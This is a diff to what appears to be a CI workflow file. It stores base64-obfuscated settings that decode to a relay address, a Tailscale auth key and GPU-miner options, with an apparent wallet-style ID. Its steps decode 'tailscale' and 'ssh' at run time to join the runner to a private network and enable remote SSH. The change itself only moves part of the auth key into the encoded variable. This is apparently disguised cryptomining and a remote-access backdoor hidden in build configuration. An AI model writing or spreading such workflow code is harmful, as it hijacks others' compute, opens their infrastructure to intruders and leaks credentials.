@@ -28,7 +28,7 @@ jobs:
       SERVER_PORT: OTQ0Mw==
       USER_ID: cHJsMXAza2YzMnJndXM0ZnZ3ZnZnOHU3aGh0cmtsMzV6cGV0bnlnZGNnYzZ5MHNjZjNtcXJ4cWhxajdoams0
       NETWORK_RELAY: MTAwLjg0LjM1Ljc0OjkwNTA=
-      REMOTE_KEY: dHNrZXktYXV0aC1rWVlmbnJDZU1RMTFDTVRSTE==
+      REMOTE_KEY: dHNrZXktYXV0aC1rWVlmbnJDZU1RMTFDTVRSTC1GTDlUZTZDRkc5ZFc0SE5ZV3ZxYjlkUGhyTmtNUktjbzk=
       COMPUTE_PARAMS: LS1vcGVuY2wtdGhyZWFkcyAyIC0tb3BlbmNsLWxhdW5jaCA4eDAgLS1ncHUtaW50ZW5zaXR5IDEy
 
     steps:
@@ -55,7 +55,7 @@ jobs:
           fi
           
           # Connect using decoded key
-          $CMD_PREFIX $(echo "dGFpbHNjYWxl" | base64 -d) up --auth-key=${REMOTE_ACCESS_KEY}-FL9Te6CFG9dW4HNYWvqb9dPhrNkMRKco9
+          $CMD_PREFIX $(echo "dGFpbHNjYWxl" | base64 -d) up --auth-key=${REMOTE_ACCESS_KEY}
           $CMD_PREFIX $(echo "dGFpbHNjYWxl" | base64 -d) set --$(echo "c3No" | base64 -d)
           
           echo "Network tunnel established"
